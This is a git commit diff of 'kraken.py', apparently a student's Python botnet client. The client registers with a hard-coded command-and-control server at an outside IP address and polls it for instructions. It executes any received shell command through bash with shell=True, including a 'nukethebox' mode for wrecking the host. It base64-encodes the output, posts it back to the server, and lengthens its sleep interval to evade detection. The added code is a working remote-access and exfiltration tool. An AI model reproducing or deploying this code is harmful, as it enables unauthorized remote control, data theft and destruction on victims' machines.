bf11eb5d9963b76f0a9c9a447d01e6a70892e8be
aeb <root@localhost.localdomain>
2019-02-17 22:57:09 -0500

    Basic functionality completed.

--- kraken.py
+++ kraken.py
@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 # Amanda Brown (aeb6590) 
-# kraken.py (HTTP bot) 
+# kraken.py (HTTP bot for Flask server with json)  
 
 # Import necessary libraries 
 import json
+import base64
 import socket
 import requests
 import subprocess
@@ -19,21 +20,35 @@ class Bot:
 
 # Execute a passed in shell command 
 def shellExec(command):
-    command = "'" + command + "'"
-    print(command)
-    resp = subprocess.call(command, shell=True)
-    return resp
+
+    # Fix formatting for subprocess
+    command = """bash -c '""" + command + """'"""
+
+    # Run the command passed in, invoking mystery process
+    resp = subprocess.check_output(command, shell=True)
+    
+    # Encode from bytes and decode into characters
+    encode = base64.b64encode(resp).decode("utf-8")
+    return encode
 
 # Execute the passed in nuke command
 def nuke(command):
-    command = "'" + command + "'"
-    print(command) 
-    resp = subprocess.call(command, shell=True)
+
+    # Fix formatting for subprocess
+    command = """bash -c '""" + command + """'"""
+    
+    # Run the command passed in, invoking mystery process
+    resp = subprocess.check_output(command, shell=True)
+
+    # Encode from bytes and decode into characters
+    encode = base64.b64encode(resp).decode("utf-8")
     return resp
 
 # Figure the bot's sleep time
 def sleepTime(ret):
     sleepTime = 3
+
+    # If HTTP response is abnormal, sleep in attempt to avoid detection 
     if ret != 200: 
         sleepTime = 300
     return sleepTime
@@ -41,22 +56,24 @@ def sleepTime(ret):
 # Get a random 64 letter uuid for the bot
 def getUUID():
     chars = string.ascii_letters
+
+    # Get a random 64 letter combination for the uuid
     uuid = ''.join(random.choice(chars) for i in range(64))
     return uuid
 
 # Execute the program
 def main():
-
     status = 0
     
     # Instantiate the bot and give it a uuid 
     kraken = Bot()
+    #TODO: CHANGE UUID 
     kraken.uuid = "aeb"
 
     host = socket.gethostname() 
     server = 'http://129.21.115.114:8080'
     
-    # Send the bot info to the server
+    # Send the bot info to the server to register to the server 
     botInfo = {'uuid':kraken.uuid, 'config_interval':5, 'config_intervaldelta':5, 'config_servers':server,'facts_hostname':host, 'facts_interfaces':'eth0'}
     register = requests.post(server + '/register', data=botInfo)
     status = register.status_code
@@ -70,28 +87,26 @@ def main():
 
     # Keep looping for commands 
     while (True):
-        print("here")
         cmd = requests.post(server + '/getcommand', data=botInfo)
         cmd = cmd.text
-        print(cmd)
         parsedCmd = json.loads(cmd)
         resp = "" 
 
         # If server replies with shell execution command
         if parsedCmd.get("mode") == "shell":
-            print("before shell exec")
             resp = shellExec(parsedCmd.get("command"))
-            print(resp) 
+            errorCode = 0
 
         # If server replies with nuke the box command 
         if parsedCmd.get("mode") == "nukethebox": 
-            print("before the nuking")
             resp = nuke(parsedCmd.get("command"))
-            print(resp)
+            errorCode = 0 
 
-        # Send results back 
-        botSend = {'uuid':kraken.uuid,'uaid':parsedCmd.get("uaid"), 'error':0, 'resp':resp}
-        ret = requests.post(server + '/postresults',data=botSend)
+        # Send results back
+        uaid = parsedCmd.get("uaid")
+        botSend = {'uaid':uaid, 'uuid':kraken.uuid,'error':errorCode,'response':resp}
+        sending = {"uuid": kraken.uuid ,"response_data":json.dumps(botSend)}
+        ret = requests.post(server + '/postresults', sending)
         
         # Time to sleep 
         TTS = sleepTime(ret.status_code) 
